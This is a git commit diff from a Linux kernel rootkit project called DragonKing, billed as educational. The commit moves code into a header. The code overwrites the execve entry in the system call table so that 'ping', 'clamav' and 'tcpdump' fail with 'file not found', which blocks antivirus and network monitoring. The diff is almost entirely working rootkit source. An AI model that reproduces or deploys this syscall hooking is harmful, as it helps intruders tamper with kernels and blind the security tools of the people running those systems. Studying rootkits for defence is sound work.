f152e7860cdd691ce04a91abed7f003f36568409
Michael Grube <michael.grube@gmail.com>
2017-06-25 19:12:17 -0400

    Move functions to header

--- DragonKing.c
+++ DragonKing.c
@@ -8,32 +8,6 @@ MODULE_DESCRIPTION("A rootkit for educational purposes");
 
 unsigned long** sys_call_table;
 
-//This is my stupid execve example. If a banned process is run, it says file not found.
-asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){
-
-	char *kern_buff = NULL;
-	int i;
-	int ret = NULL;
-	kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
-	copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));
-
-	bool isBanned = false;
-
-	printk("FILENAME: %s\n", kern_buff);
-	for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){
-	
-	if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
-	//printk("Banned process was executed.\n");
-	ret = -ENOENT;
-	return ret;
-	}
-	
-	}
-	
-	ret = (*orig_execve)(filename, argv, envp);
-	return ret;
-}
-
 //We need this to set access permissions on the address we pass to it
 void set_addr_rw(unsigned long addr)
 {
@@ -56,10 +30,15 @@ void set_addr_ro(unsigned long addr)
 
 static int __init dragonking_init(void)
 {
+	//Search /proc/kallsyms for sys_call_table's address
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
+	//Change object's permission to RW
 	set_addr_rw((unsigned long) sys_call_table);
+	//Set orig_execve to be the origin execve pointer
 	orig_execve = (void *)sys_call_table[__NR_execve];
+	//Replace original pointer with ours
 	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
+	//Set back to RO
 	set_addr_ro((unsigned long) sys_call_table);
 	printk(KERN_INFO "This is a rootkit.\n");
 	return 0;    
--- DragonKing.h
+++ DragonKing.h
@@ -5,9 +5,6 @@
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
 #include <linux/err.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/init.h>
 #include <linux/types.h>
 #include <linux/unistd.h>
 #include <asm/uaccess.h>
@@ -16,15 +13,39 @@
 #include <linux/utsname.h>
 #include <linux/file.h>
 #include <linux/fdtable.h>
-#include <linux/slab.h>
 #include <linux/proc_ns.h>
 
 
-asmlinkage long (*orig_execve)(const char __user *filename, char const __user *argv[], char const __user *envp[]);
-
-asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]);
-
-// List of processes we won't allow to run
 const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};
 
+asmlinkage long (*orig_execve)(const char __user *filename, char const __user *argv[], char const __user *envp[]);
+
+//asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]);
+
+//This is my stupid execve example. If a banned process is run, it says file not found.
+//It would be dumb as hell to use this in real life. A pretty big giveaway that you're present.
+asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){
+
+        char *kern_buff = NULL;
+        int i;
+        int ret = NULL;
+        kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
+        copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));
+
+        bool isBanned = false;
+
+        printk("FILENAME: %s\n", kern_buff);
+        for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){
+
+        if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
+        //printk("Banned process was executed.\n");
+        ret = -ENOENT;
+        return ret;
+        } 
+
+        }
+
+        ret = (*orig_execve)(filename, argv, envp);
+        return ret;
+}
 
